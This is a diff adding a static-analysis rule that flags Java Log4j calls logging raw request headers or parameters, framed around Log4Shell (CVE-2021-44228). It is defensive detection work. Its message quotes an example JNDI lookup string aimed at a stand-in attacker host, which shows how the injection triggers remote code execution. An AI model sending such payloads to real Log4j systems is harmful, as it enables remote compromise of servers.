@@ -1,0 +1,31 @@
+rules:
+  - id: java-log4j-unsanitized-input
+    languages: [java]
+    severity: WARNING
+    message: >-
+      Found a Log4j logger call where user-controlled input (a
+      request/header value) is logged directly. This is the exact injection
+      point exploited by Log4Shell (CVE-2021-44228): on vulnerable Log4j2
+      versions (<2.17.1), a crafted string like
+      "${jndi:ldap://attacker.com/a}" logged this way triggers a remote
+      JNDI lookup that leads to remote code execution, simply because it was
+      logged - no other application logic needs to touch the string. Even
+      on patched Log4j versions, logging raw request data enables log
+      injection (CRLF/forged log entries). Ensure Log4j is >= 2.17.1 and
+      never log raw, unsanitized request data (headers, User-Agent,
+      X-Forwarded-For are the classic vectors).
+    metadata:
+      category: security
+      confidence: LOW
+      cwe: "CWE-117: Improper Output Neutralization for Logs"
+      owasp: ["A09:2021 - Security Logging and Monitoring Failures"]
+      references:
+        - https://cwe.mitre.org/data/definitions/117.html
+        - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+        - https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a
+    patterns:
+      - pattern-either:
+          - pattern: logger.info($REQ.getHeader(...))
+          - pattern: logger.warn($REQ.getHeader(...))
+          - pattern: logger.error($REQ.getHeader(...))
+          - pattern: logger.info($REQ.getParameter(...))
